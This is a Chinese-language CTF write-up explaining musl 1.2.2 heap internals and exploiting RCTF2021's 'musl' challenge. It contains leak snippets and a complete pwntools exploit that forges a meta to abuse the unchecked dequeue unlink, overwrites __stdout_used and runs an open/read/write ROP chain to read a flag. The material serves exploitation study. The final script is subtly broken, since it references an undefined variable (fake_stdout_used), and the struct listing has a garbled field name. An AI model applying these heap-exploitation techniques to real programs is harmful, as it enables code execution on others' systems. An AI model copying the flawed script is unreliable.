# musl 入门

## 基本知识

### 数据结构

几个重要的数据结构

group chunk，许多 chunk 实际上是挤在一起的，这堆 chunk 最上面通过 group 来管理，索引到一个 meta

```c
struct group {
    struct meta *meta;
    unsigned char active_idx:5;
    char pad[UNIT - sizeof(struct meta *) - 1];//padding=0x10B
    unsigned char storage[];// chunks
};
struct chunk{
 char prev_user_data[];
    uint8_t idx; 
    uint16_t offset; 
    char data[];
};
```

meta ，管理 group 的结构体，记录了很多内容，avail_mask，freed_mask 分别记录存活 chunk 和已经free的 chunk ，然后 chunk 直接通过偏移获得 meta 通过头部的两个指针链起来

```c
struct meta {
    struct meta *prev, *next;
    struct group *mem;
    volatile int avail_mask, freed_mask;
    uintptr_t last_idx:5;
    uintptr_t freeable:1;
    uintptr_t sizeclass:6;
    uintptr_t maplen:8*sizeof(uintptr_t)-12;
};
```

malloc_context 

```c
struct malloc_context {
    uint64_t secret;// 和meta_area 头的check 是同一个值 就是校验值
#ifndef PAGESIZE
    size_t pagesize;
#endif
    int init_done;//是否初始化标记
    unsigned mmap_counter;// 记录有多少mmap 的内存的数量
    struct meta *free_meta_head;// 被free 的meta 头 这里meta 管理使用了队列和双向循环链表
    struct meta *avail_meta;//指向可用meta数组
    size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift;
    struct meta_area *meta_area_head, *meta_area_tail;
    unsigned char *avail_meta_areas;
    struct meta *active[48];// 记录着可用的meta
    size_t u sage_by_class[48];
    uint8_t unmap_seq[32], bounces[32];
    uint8_t seq;
    uintptr_t brk;
};
```

![image-20220819131141654](musl%E5%85%A5%E9%97%A8/image-20220819131141654.png)

### malloc free 逻辑

#### malloc

从 malloc_context 的 active 中找到对应大小的 meta 队列，如果没有的话就找大一点的，如果存在就进入 meta 查看 avail_mask 是否有空闲可用的堆块，如果有就通过 index 直接返回 Group 对应偏移的指针作为 chunk ，之后再看 freed_mask 是否有已经 free 的堆块，这个时候才会重新启用 free 掉的堆块

下面演示的是将大块的 chunk 给解链然后给小 chunk 使用 `active[15][1]`

![image-20220819132240172](musl%E5%85%A5%E9%97%A8/image-20220819132240172.png)

![image-20220819132450704](musl%E5%85%A5%E9%97%A8/image-20220819132450704.png)

#### free

从当前地址获取到 meta ，将 freed_mask 对应位置置1，如果该group中的chunk全空或者全满就会进入 nontrivial_free 调用 dequeue 对该meta进行解链，之后更新 malloc_context 的 active 

下面演示的是将空闲 meta 解链进入 free_meta `active[0][0] active[5][0]`

其次，在关于meta处有个检查，这里直接通过去掉低三字节来得到 meta_area 的地址，之后得到 secret

```c
const struct meta_area *area = (void *)((uintptr_t)meta & -4096);// 得到meta_area 地址
```

另外，可以看到 musl 有一个很有趣的特点，可以看到这里面 meta 的 mem 指针颜色都是紫色的，这代表他们都是 bss 段的内容，也就是说，musl 是会优先拉当前空闲的内存

![image-20220819132908562](musl%E5%85%A5%E9%97%A8/image-20220819132908562.png)

![image-20220819132936227](musl%E5%85%A5%E9%97%A8/image-20220819132936227.png)

其中，那两个 meta 指针连接了起来，我们便是通过这个没有检查的解链操作来进行攻击，看一下源码的解链操作，几乎没有任何检查，就是很直接的双向链表删除操作

```c
static inline void dequeue(struct meta **phead, struct meta *m)
{
	if (m->next != m) {
		m->prev->next = m->next;
		m->next->prev = m->prev;
		if (*phead == m) *phead = m->next;
	} else {
		*phead = 0;
	}
	m->prev = m->next = 0;
}
```

### 利用方法

所以我们的利用方法就是想办法进入 dequeue 随后 unlink 写到类似于 stdout 的指针，最后伪造 iofile 得到控制流

关于伪造的 meta 以及触发点，我们可以通过 free 已经改过 idx 的chunk 来指到一个错误的 group 随后指到一个 伪造的 meta，将 meta 那一页的开头写上 secret 过检查，随后构造 unlink 指针即可

## RCTF2021-musl

题目版本 1.2.2

### 漏洞点

其中size可以等于0，然后就可以溢出一大堆

![image-20220819133625374](musl%E5%85%A5%E9%97%A8/image-20220819133625374.png)

程序会申请一个 0xc 大小堆块来管理 data ，另外程序没有给 edit

### 漏洞利用

#### 泄露

要想泄露地址的话，首先要和残留有libc或者对地址的块物理相邻，因为本题的特点，管理块里是有堆块地址的，另外又根据musl的特性，这两个地址实际上在 libc 附近（因为就是libc的bss），所以泄露出堆地址也就泄露出了libc地址

``` python
# 先把这个大小 chunk 全部申请,不然不会启用 free 掉的 chunk
for i in range(15):
add(i,0xc)

# 把开头的 chunk free 掉
# 此时 avail_mask 为 0，free_mask 中有两个 chunk
delete(0)
```

此时 freed_mask 为 3 也就是 11(b)，这表示第 0 号和第 1 号 chunk 被 free

![image-20220819153141749](musl%E5%85%A5%E9%97%A8/image-20220819153141749.png)

看到下面的index位已经变成两个 0xff

![image-20220819153406954](musl%E5%85%A5%E9%97%A8/image-20220819153406954.png)

```python
# 先把这个大小 chunk 全部申请,不然不会启用 free 掉的 chunk
for i in range(15):
    add(i,0xc)

# 把开头的 chunk free 掉
# 此时 avail_mask 为 0，free_mask 中有两个 chunk
delete(0)

# 再申请回来，只需要把 0x4 字节的 chunk 头填掉就可以泄露，注意此时下一个 chunk 的头已经烂掉了
add(0 ,0 , 'a'*0xf + '\n')
show(0)

# 貌似这个偏移有点问题，因为是自己编译的 libc 
libc.address = l64() - 0xa6cf0
__malloc_context = libc.sym["__malloc_context"]

# 接下来可以直接写管理块的 data 域实现任意地址读
delete(2)
add(2 , 0 , 'a'*0x10 + p64(__malloc_context) + '\n')
show(3)
ru('t: ')
secret = uu64(8)
```

至此泄露结束

#### orw

最后是unlink利用环节，首先我们可以实现堆溢出，并且可以溢出很多字节，所以我们可以写到 chunk 的index 让其找到一个伪造的 group ，其后根据索引得到一个伪造的 meta ，随后在这个 meta 清低三字节的地方写上 secret，最后删除堆块进行 dequeue 把__stdout_used改了

接下来是orw环节，本题开了sandbox，不能直接用

最后是偷的脚本

```python
# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './musl'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a = 6      : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a = 4      : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla('>>',num)

def add(idx , size , content = 'a\n'):
    cmd(1)
    sla('idx' , idx)
    sla('size' , size)
    sa('Contnet?\n' , content)

def delete(idx ):
    cmd(2)
    sla('idx' , idx)

def show(idx ):
    cmd(3)
    sla('idx' , idx)

def attack():
    
    # 先把这个大小 chunk 全部申请,不然不会启用 free 掉的 chunk
    for i in range(15):
        add(i,0xc)

    # 把开头的 chunk free 掉
    # 此时 avail_mask 为 0，free_mask 中有两个 chunk
    delete(0)

    # 再申请回来，只需要把 0x4 字节的 chunk 头填掉就可以泄露，注意此时下一个 chunk 的头已经烂掉了
    add(0 ,0 , 'a'*0xf + '\n')
    show(0)

    libc.address = l64() - 0x298d50
    libc_base = libc.address
    __malloc_context = libc.sym["__malloc_context"]
    
    # 接下来可以直接写管理块的 data 域实现任意地址读
    delete(2)
    add(2 , 0 , 'a'*0x10 + p64(__malloc_context) + '\n')
    show(3)
    ru('t: ')
    secret = uu64(8)

    fake_meta = libc_base + 0x28d000+0x1000+8
    fake_mem = libc_base + 0x298df0-0x20
    _stdout_used = libc_base+0x295450
    fake_stdout_ptr = libc_base + 0x28d000+0x50
    rop_addr = libc_base + 0x28d000+0x100
    flag_addr = rop_addr - 0x100 + 0x20

    magic_gadget = libc_base + 0x000000000004a5ae
    p_rdi_rax = libc_base + 0x000000000007144e
    p_rsi = libc_base + 0x000000000001b27a
    p_rdx = libc_base + 0x0000000000009328
    sys_call = libc_base + 0x0000000000023711
    ret = libc_base + 0x000000000001689c

    delete(5)

    payload = p64(fake_meta) + p64(0) + p64(fake_mem + 0x20)
    add(5,0,payload + '\n')

    #open(flag,0)
    rop  = p64(p_rdi_rax)+p64(flag_addr)+p64(2)
    rop += p64(p_rsi)+p64(0)+p64(sys_call)

    #read(fd,buf,size)
    rop += p64(p_rdi_rax)+p64(3)+p64(0)
    rop += p64(p_rsi)+p64(flag_addr+0x600)
    rop += p64(p_rdx)+p64(0x30)+p64(sys_call)

    #write(1,buf,size)
    rop += p64(p_rdi_rax)+p64(1)+p64(1)
    rop += p64(p_rsi)+p64(flag_addr+0x600)
    rop += p64(p_rdx)+p64(0x30)+p64(sys_call)

    payload  = './flag'.ljust(0x30,'\x00')
    #fake __stdout_FILE
    payload += '\x00'*0x30 + p64(rop_addr) + p64(ret) + p64(0) + p64(magic_gadget)
    payload  = payload.ljust(0x100-0x20,'\x00') 
    payload += rop
    payload = payload.ljust(0x1000-0x20,'\x00')

    # __stdout_used
    payload += p64(secret)+p64(fake_stdout_ptr)+p64(fake_stdout_used)+p64(fake_mem)
    payload += p32(0x7e)+p32(0)
    freeable = 1
    maplen = 1
    sizeclass = 1
    last_idx = 6
    last_value = last_idx | (freeable << 5) | (sizeclass << 6) | (maplen << 12)
    payload +=p64(last_value)+p64(0)
    
    add(10,0x2000,payload + '\n')
    # dbg()

    delete(6)
    
    cmd(4)
    
    p.interactive()

attack()

'''
@File    :   musl-exp.py
@Time    :   2022/08/19 11:34:14
@Author  :   Niyah 
'''
```

## reference

[从musl libc 1.1.24到1.2.2 学习pwn姿势 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/253566#h3-5)

[musl 1.2.2 总结+源码分析 One-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com](https://bbs.pediy.com/thread-269533-1.htm#msg_header_h3_6)